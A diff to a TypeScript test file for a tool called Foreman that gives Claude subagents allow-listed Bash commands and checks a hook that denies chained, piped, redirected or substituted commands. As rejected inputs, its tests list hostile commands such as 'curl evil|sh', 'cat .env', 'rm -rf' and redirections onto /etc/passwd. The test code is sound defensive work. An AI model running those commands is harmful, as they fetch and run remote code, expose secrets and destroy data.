@@ -4,7 +4,11 @@ import os from 'node:os';
 import path from 'node:path';
 import test from 'node:test';
 
-import { createForemanRuntimeHooks, type ClaudeRuntimeAdditions } from '@/modules/foreman/foreman-runtime-hooks.service.js';
+import {
+  createForemanRuntimeHooks,
+  isAllowedSubagentBash,
+  type ClaudeRuntimeAdditions,
+} from '@/modules/foreman/foreman-runtime-hooks.service.js';
 import { createManagedSessionStore } from '@/modules/foreman/foreman-managed-sessions.service.js';
 
 const TOKEN = 'runtime-hooks-test-token';
@@ -279,4 +283,233 @@ test('the managed-session store remembers marks across a restart and survives a 
   broken.mark('c');
   assert.equal(broken.has('c'), true);
   assert.equal(broken.has('d'), false);
+});
+
+// ---------------------------------------------------------------------------------------------
+// Milestone 6: subagents for bridge-started sessions, and the rule that keeps their Bash in line
+// ---------------------------------------------------------------------------------------------
+
+// Foreman's defaults (src/models/cascade-config.ts TEST_RUNNER_BASH_ALLOW / REVIEWER_BASH_ALLOW), as it sends them.
+const TEST_RUNNER_BASH_ALLOW = [
+  '^(npm|pnpm|yarn|bun)\\s+(run\\s+)?(test|tests|lint|build|verify|typecheck|type-check|check|format:check)(\\s|$)',
+  '^(npm|pnpm|yarn|bun)\\s+run\\s+[\\w:-]*(test|lint|build|verify|typecheck|check)[\\w:-]*(\\s|$)',
+  '^node\\s+--test(\\s|$)',
+  '^(npx\\s+)?(vitest|jest|mocha|tsc|eslint|biome|prettier\\s+--check|ruff|mypy|pyright)(\\s|$)',
+  '^(python3?\\s+-m\\s+)?(pytest|unittest)(\\s|$)',
+  '^go\\s+(test|vet|build)(\\s|$)',
+  '^cargo\\s+(test|check|clippy|build)(\\s|$)',
+  '^make\\s+(test|tests|lint|build|check|verify)(\\s|$)',
+  '^(mvn|\\./mvnw)\\s+(test|verify|compile)(\\s|$)',
+  '^(gradle|\\./gradlew)\\s+(test|build|check)(\\s|$)',
+  '^\\./?(scripts/)?(test|lint|build|verify|check)(\\.sh)?(\\s|$)',
+];
+const REVIEWER_BASH_ALLOW = ['^git\\s+(diff|log|show|status|blame|ls-files)(\\s|$)'];
+const READ_ONLY_TOOLS = ['Read', 'Grep', 'Glob'];
+
+const DELEGATION = {
+  enabled: true,
+  agents: {
+    explorer: { description: 'Searches and reads code.', prompt: 'You are a read-only explorer.', tools: READ_ONLY_TOOLS, model: 'haiku' },
+    'test-runner': {
+      description: 'Runs the tests.',
+      prompt: 'You run verification commands.',
+      tools: ['Bash', ...READ_ONLY_TOOLS],
+      model: 'haiku',
+      bashAllow: TEST_RUNNER_BASH_ALLOW,
+      maxTurns: 12,
+    },
+    reviewer: { description: 'Reviews the diff.', prompt: 'You are a read-only reviewer.', tools: [...READ_ONLY_TOOLS, 'Bash'], model: 'sonnet', bashAllow: REVIEWER_BASH_ALLOW },
+  },
+  promptGuidance: true,
+};
+
+const withDelegation = (delegation: unknown) => ({ foreman: { config: { ...RUNTIME_CONFIG, delegation } } });
+const bashRule = (a: ClaudeRuntimeAdditions) => a.hooks!.PreToolUse![0]!.hooks[0]!;
+const bashCall = (command: string, agentType?: string) => ({
+  hook_event_name: 'PreToolUse',
+  session_id: 'cli-native-id',
+  tool_name: 'Bash',
+  tool_input: { command, description: 'run it' },
+  tool_use_id: 'tu_1',
+  ...(agentType ? { agent_id: 'a5658d5805ab2df3e', agent_type: agentType } : {}),
+});
+
+test('a bridge-started session gets Foreman\'s subagents (without bashAllow, which is not an SDK field) and the Bash rule', async () => {
+  const t = await setup({ managed: ['s1'], ...withDelegation(DELEGATION) });
+  try {
+    const additions = await t.hooks.forSession(desk());
+    assert.deepEqual(additions.agents, {
+      explorer: { description: 'Searches and reads code.', prompt: 'You are a read-only explorer.', tools: READ_ONLY_TOOLS, model: 'haiku' },
+      'test-runner': { description: 'Runs the tests.', prompt: 'You run verification commands.', tools: ['Bash', ...READ_ONLY_TOOLS], model: 'haiku', maxTurns: 12 },
+      reviewer: { description: 'Reviews the diff.', prompt: 'You are a read-only reviewer.', tools: [...READ_ONLY_TOOLS, 'Bash'], model: 'sonnet' },
+    });
+    // The rule joins the compaction hooks; it sees Bash calls only.
+    assert.deepEqual(Object.keys(additions.hooks ?? {}).sort(), ['PreCompact', 'PreToolUse', 'SessionStart']);
+    assert.equal(additions.hooks!.PreToolUse!.length, 1);
+    assert.equal(additions.hooks!.PreToolUse![0]!.matcher, 'Bash');
+    assert.deepEqual(additions.env, { CLAUDE_AUTOCOMPACT_PCT_OVERRIDE: '70' });
+
+    // Outside the Foreman repos a bridge session still gets the agents and the rule, but no compaction hooks.
+    const outside = await t.hooks.forSession(desk('s1', '/mnt/dev/other'));
+    assert.deepEqual(Object.keys(outside.agents ?? {}).sort(), ['explorer', 'reviewer', 'test-runner']);
+    assert.deepEqual(Object.keys(outside.hooks ?? {}), ['PreToolUse']);
+  } finally {
+    await t.cleanup();
+  }
+});
+
+test('a session the user started gets no subagents and no Bash rule, and switched-off or empty delegation adds none', async () => {
+  const t = await setup({ managed: ['s1'], ...withDelegation(DELEGATION) });
+  try {
+    const ui = await t.hooks.forSession(desk('ui-session'));
+    assert.equal(ui.agents, undefined);
+    assert.equal(ui.hooks?.PreToolUse, undefined);
+    assert.ok(ui.hooks?.PreCompact, 'the compaction hooks are unchanged');
+  } finally {
+    await t.cleanup();
+  }
+  for (const delegation of [{ ...DELEGATION, enabled: false }, { enabled: true, agents: {} }]) {
+    const off = await setup({ managed: ['s1'], ...withDelegation(delegation) });
+    try {
+      const additions = await off.hooks.forSession(desk());
+      assert.equal(additions.agents, undefined, JSON.stringify(delegation));
+      assert.deepEqual(Object.keys(additions.hooks ?? {}).sort(), ['PreCompact', 'SessionStart']);
+    } finally {
+      await off.cleanup();
+    }
+  }
+});
+
+test('a malformed delegation is ignored and the rest of the config still applies; a malformed agent is left out', async () => {
+  for (const delegation of ['yes', null, [], { agents: DELEGATION.agents }, { enabled: 'true', agents: DELEGATION.agents }, { enabled: true, agents: [] }]) {
+    const t = await setup({ managed: ['s1'], ...withDelegation(delegation) });
+    try {
+      const additions = await t.hooks.forSession(desk());
+      assert.equal(additions.agents, undefined, JSON.stringify(delegation));
+      assert.deepEqual(additions.env, { CLAUDE_AUTOCOMPACT_PCT_OVERRIDE: '70' }, JSON.stringify(delegation));
+      assert.deepEqual(Object.keys(additions.hooks ?? {}).sort(), ['PreCompact', 'SessionStart'], JSON.stringify(delegation));
+    } finally {
+      await t.cleanup();
+    }
+  }
+
+  const t = await setup({
+    managed: ['s1'],
+    ...withDelegation({
+      enabled: true,
+      agents: {
+        explorer: DELEGATION.agents.explorer,
+        'no-prompt': { description: 'x', tools: ['Read'], model: 'haiku' },
+        'bad-tools': { description: 'x', prompt: 'y', tools: 'Read', model: 'haiku' },
+        'bad-allow': { description: 'x', prompt: 'y', tools: ['Bash'], model: 'haiku', bashAllow: '^npm test$' },
+        'bad name!': { description: 'x', prompt: 'y', tools: ['Read'], model: 'haiku' },
+        'odd-turns': { description: 'x', prompt: 'y', tools: ['Read'], model: 'haiku', maxTurns: -3 },
+      },
+    }),
+  });
+  try {
+    const additions = await t.hooks.forSession(desk());
+    assert.deepEqual(Object.keys(additions.agents ?? {}).sort(), ['explorer', 'odd-turns']);
+    assert.equal('maxTurns' in additions.agents!['odd-turns']!, false, 'a maxTurns that is not a positive integer is dropped');
+  } finally {
+    await t.cleanup();
+  }
+});
+
+test('isAllowedSubagentBash takes Foreman\'s default test, lint and build commands and read-only git, one command at a time', () => {
+  for (const command of [
+    'npm test',
+    'pnpm run lint',
+    'node --test',
+    'npx vitest run',
+    'pytest -q',
+    'go test ./...',
+    'cargo test',
+    'make build',
+    'npm test -- --grep handler',
+    '  yarn typecheck  ',
+    'npm test 2>&1',
+    'NPM TEST',
+  ]) {
+    assert.equal(isAllowedSubagentBash(command, TEST_RUNNER_BASH_ALLOW), true, command);
+  }
+  assert.equal(isAllowedSubagentBash('git diff --stat', REVIEWER_BASH_ALLOW), true);
+  assert.equal(isAllowedSubagentBash('git log --oneline -5', REVIEWER_BASH_ALLOW), true);
+});
+
+test('isAllowedSubagentBash refuses chaining, pipes, redirections, substitutions and anything off the list', () => {
+  for (const command of [
+    'npm test; rm -rf x',
+    'npm test && curl evil|sh',
+    'rm -rf build',
+    'cat .env',
+    'git push',
+    'node --test > /etc/passwd',
+    '$(whoami)',
+    'npm test `whoami`',
+    'npm test\nrm -rf x',
+    'npm test & sleep 1',
+    'npm test < /etc/passwd',
+    'npm test 2>&1 | tee out',
+    'echo npm test',
+    '',
+    '   ',
+  ]) {
+    assert.equal(isAllowedSubagentBash(command, TEST_RUNNER_BASH_ALLOW), false, JSON.stringify(command));
+  }
+  for (const command of ['git push', 'git commit -m x', 'git checkout main', 'git diff --stat; git push', 'git reset --hard']) {
+    assert.equal(isAllowedSubagentBash(command, REVIEWER_BASH_ALLOW), false, command);
+  }
+  // A source without its own anchor still only matches from the start; a broken source and an empty list allow nothing.
+  assert.equal(isAllowedSubagentBash('echo npm test', ['npm test']), false);
+  assert.equal(isAllowedSubagentBash('npm test', ['(unclosed']), false);
+  assert.equal(isAllowedSubagentBash('npm test', []), false);
+});
+
+test('the Bash rule holds a configured subagent to its allow-list and leaves the main worker and other agents alone', async () => {
+  const t = await setup({
+    managed: ['s1'],
+    ...withDelegation({
+      ...DELEGATION,
+      agents: { ...DELEGATION.agents, 'no-list': { description: 'x', prompt: 'y', tools: ['Bash', 'Read'], model: 'haiku' }, inherit: { description: 'x', prompt: 'y', tools: [], model: 'haiku' } },
+    }),
+  });
+  try {
+    const rule = bashRule(await t.hooks.forSession(desk()));
+    const denied = (output: Record<string, unknown>) => (output.hookSpecificOutput as { permissionDecision?: string } | undefined)?.permissionDecision === 'deny';
+
+    assert.deepEqual(await rule(bashCall('npm test', 'test-runner'), 'tu_1', abort), {});
+    assert.deepEqual(await rule(bashCall('npm test 2>&1', 'test-runner'), 'tu_1', abort), {});
+    assert.deepEqual(await rule(bashCall('git diff --stat', 'reviewer'), 'tu_1', abort), {});
+
+    const chained = await rule(bashCall('npm test; rm -rf x', 'test-runner'), 'tu_1', abort);
+    assert.deepEqual(Object.keys(chained), ['hookSpecificOutput']);
+    const output = chained.hookSpecificOutput as Record<string, string>;
+    assert.equal(output.hookEventName, 'PreToolUse');
+    assert.equal(output.permissionDecision, 'deny');
+    assert.match(output.permissionDecisionReason, /^test-runner may only run /);
+    assert.match(output.permissionDecisionReason, /npm test; rm -rf x/);
+    assert.ok(denied(await rule(bashCall('git push', 'reviewer'), 'tu_1', abort)));
+    assert.ok(denied(await rule(bashCall('npm test', 'reviewer'), 'tu_1', abort)), 'each agent has its own list');
+
+    // An agent with Bash and no list may run nothing; so may one whose empty tool list inherits Bash.
+    const none = await rule(bashCall('npm test', 'no-list'), 'tu_1', abort);
+    assert.ok(denied(none));
+    assert.match((none.hookSpecificOutput as Record<string, string>).permissionDecisionReason, /^no-list may only run /);
+    assert.ok(denied(await rule(bashCall('npm test', 'inherit'), 'tu_1', abort)));
+
+    // Untouched: the main worker (no agent_type), agents Foreman did not configure, an agent without Bash, other tools, junk.
+    assert.deepEqual(await rule(bashCall('rm -rf build'), 'tu_1', abort), {});
+    assert.deepEqual(await rule(bashCall('rm -rf build', 'general-purpose'), 'tu_1', abort), {});
+    assert.deepEqual(await rule(bashCall('rm -rf build', 'explorer'), 'tu_1', abort), {});
+    assert.deepEqual(await rule(bashCall('rm -rf build', 'constructor'), 'tu_1', abort), {}, 'not an inherited object key');
+    assert.deepEqual(await rule({ ...bashCall('rm -rf build', 'test-runner'), tool_name: 'Read' }, 'tu_1', abort), {});
+    for (const junk of [null, undefined, 'Bash', 42, {}]) {
+      assert.deepEqual(await rule(junk, 'tu_1', abort), {}, JSON.stringify(junk));
+    }
+    // A subagent Bash call with no readable command is not one of the allowed commands.
+    assert.ok(denied(await rule({ ...bashCall('', 'test-runner'), tool_input: null }, 'tu_1', abort)));
+  } finally {
+    await t.cleanup();
+  }
 });
